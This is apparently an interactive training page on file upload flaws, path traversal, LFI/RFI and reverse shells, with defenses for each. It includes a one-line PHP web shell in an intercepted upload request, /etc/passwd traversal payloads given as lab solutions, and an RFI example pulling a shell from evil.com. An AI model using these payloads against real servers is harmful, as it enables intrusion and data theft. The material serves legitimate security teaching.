Static File vs Executable File

Uploading a file and executing a file are two different events. This distinction is critical.

Toggle Between Static and Executable

🖼️
avatar.jpg
🌐
HTTP request
📄
Web server reads bytes
🖥️
Returns raw data
🖼️
Browser displays image
The web server treats the file as data. It reads bytes and sends them to the browser. No code runs on the server.
📄
shell.php
🌐
HTTP request
⚙️
Runtime interprets code
💻
Code executes ON SERVER
📤
Result returned
The web server interprets the file as code. The PHP/ASP/JSP runtime executes the script. Code runs on the server's OS.
Core Takeaway
Uploading a file ≠ Executing a file
The vulnerability exists when the server treats uploaded content as executable code rather than static data.

Client-Side vs Server-Side Validation

Client-side validation improves UX. Server-side validation provides the actual security boundary.

🔒 Server-Side Validation

Runs on the server after the request arrives. The user cannot bypass it without modifying the server request.

✔ Actually checks file content
✔ Validates on the server
✔ Cannot be disabled by the user

⚠️ Client-Side Validation

Runs in the browser before the request is sent. The user controls the browser — they can disable or bypass it entirely.

✗ Can be disabled in browser
✗ Can be intercepted by Burp
✗ Never trust for security
🧪 Burp Suite Interception Demo

Watch how the browser enforces "JPG/PNG only" — but Burp Suite can change the Content-Type header:

Burp Suite — Intercepted Request
POST /my-account/avatar HTTP/1.1 Content-Type: multipart/form-data; boundary=----Bound   ------Bound Content-Disposition: form-data; name="avatar"; filename="exploit.php" Content-Type: image/jpeg ← CHANGED from application/x-php   <?php system($_GET['cmd']); ?> ------Bound--
The browser said "JPG/PNG only" — but we control the browser. Burp modified Content-Type to image/jpeg. Server accepted the PHP file.

// MODULE 1

Common Validation Failures

For each method, understand the developer's assumption, why it fails, and the secure alternative.

VULNERABLEExtension-Only Validation
▼
DEVELOPER ASSUMPTION
"If I block .php, attackers can't upload PHP files."
WHY IT FAILS
Double extensions (shell.php.jpg), alternative extensions (.phtml, .php5), null bytes bypass blacklist filters.
VULNERABLEMIME-Type / Content-Type Validation
▼
DEVELOPER ASSUMPTION
"I check Content-Type header — it must be image/jpeg."
WHY IT FAILS
Content-Type is sent by the client. Burp Suite can change it to image/jpeg while uploading a PHP file.
VULNERABLEBlacklist Filtering
▼
DEVELOPER ASSUMPTION
"I block .php, .php5, .phtml — all dangerous extensions."
WHY IT FAILS
Attackers can upload .htaccess to change Apache config, or use .phar, .inc, or other extensions the blacklist misses.
PARTIALAllowlist Validation
▼
BETTER APPROACH
Only allow specific extensions: .jpg, .png, .gif. Much harder to bypass.
STILL NOT SUFFICIENT ALONE
Must combine with content inspection, randomized filenames, storage outside webroot, and disabled execution in upload directories.

Storage Location Matters

Even if validation fails, storage and execution policy provide another security boundary.

❌ DANGEROUS Architecture

Upload → /var/www/html/uploads/
Publicly reachable via URL ✓
PHP/ASP execution enabled ✓
Files stored inside web root with full execution permissions.

✅ SAFER Architecture

Upload → Random filename generated
Storage outside executable webroot
Served through controlled application logic only
Even if attacker uploads PHP, the server won't execute it.
UPLOAD ≠ EXECUTION
Storage location and web server configuration determine whether an uploaded file can be executed.

Path Traversal vs LFI vs RFI

Read ≠ Include ≠ Execute Remote. Understanding the differences is critical.

📂 Path Traversal

📖
READ a file
Escape directory → access file
?file=../../../../etc/passwd

📥 LFI

⚙️
INCLUDE a file
Server processes the file
?page=../../../../var/log/access.log

🌐 RFI

💥
EXECUTE remote code
Full server compromise
?page=http://evil.com/shell.php

Comparison Table

FeaturePath TraversalLFIRFI
Main GoalAccess filesInclude local filesInclude remote files
Uses ../✓ Yes✓ Often⚠ Sometimes
Code Execution✗ Usually No⚠ Sometimes✓ Yes
Risk LevelMedium–HighHighCritical
Requires include()✗ No✓ Yes✓ Yes
Golden Rule
App reads → Path Traversal | App includes → LFI | App fetches remote → RFI

Path Traversal Lab Walkthroughs

Every lab: Scenario → Request → Input → Validation → Resolved Path → Why Fails → Defense.

Lab 1: Basic Path Traversal

No validation. Direct traversal.
// Vulnerable code
$file = $_GET['filename'];
readfile("/var/www/images/" . $file);
Solution: filename=../../../etc/passwd
Images dir is 3 levels deep. Three ../ reaches root, then /etc/passwd.

Lab 2: Absolute Path Bypass

../ blocked. Absolute paths not checked.
Solution: filename=/etc/passwd
Blacklist only filters ../. Absolute path bypasses entirely.

Lab 3: Double URL Encoding

App decodes, strips ../. Double encoding hides traversal.
Solution: filename=..%252F..%252F..%252Fetc%252Fpasswd
%252F → decode → %2F → not / → passes check → FS resolves as /.

Lab 4: Start-of-Path Validation

Checks path starts with /var/www/images/. Prefix + traversal escapes.
Solution: filename=/var/www/images/../../../etc/passwd
Passes prefix check, ../ escapes allowed directory.

Lab 5: Null Byte Bypass

Validates .jpg extension. Null byte truncates at filesystem.
Solution: filename=../../../etc/passwd%00.jpg
App sees .jpg → passes. FS stops at %00 → opens /etc/passwd. Legacy PHP only.

Why "Reverse" Shell?

The connection direction is reversed compared to a bind shell.

BIND SHELL

Target opens/listens on a port
ATTACKER → TARGET
→→→
Attacker initiates connection TO target

REVERSE SHELL

Attacker starts listener
TARGET → ATTACKER
←←←
Target initiates connection TO attacker
What is Reversed?
The connection direction.
Instead of attacker connecting to target, the compromised target connects outward to the attacker's listener.

⚠ Important Caveat
Reverse shells do NOT always bypass firewalls. Success depends on: outbound firewall policy, network routing, proxy requirements, egress filtering, destination IP/port, listener availability.

Core takeaway: "A reverse connection may be useful because the target initiates it, but outbound traffic can still be restricted."

Troubleshooting Challenge

Given scenarios — determine where the attack chain failed.

Scenario 1

File uploaded successfully. Opening URL downloads the file instead of executing it.
Where did the chain fail? Server-side execution / runtime handling. The server is returning the file as static data, not interpreting it as code.

Scenario 2

File executes but listener receives nothing.
Investigate: Callback IP, callback port, listener status, routing, outbound firewall, egress filtering.

Scenario 3

Server returns 404.
Possible issue: Incorrect storage/retrieval path. File may not be at the expected URL.

Scenario 4

Server returns 403.
Possible issue: Access control / web server policy blocking execution in that directory.

Scenario 5

Connection reaches listener but shell is limited.
Explanation: Code execution inherits the privileges of the web-server process. Do not assume root/admin access.
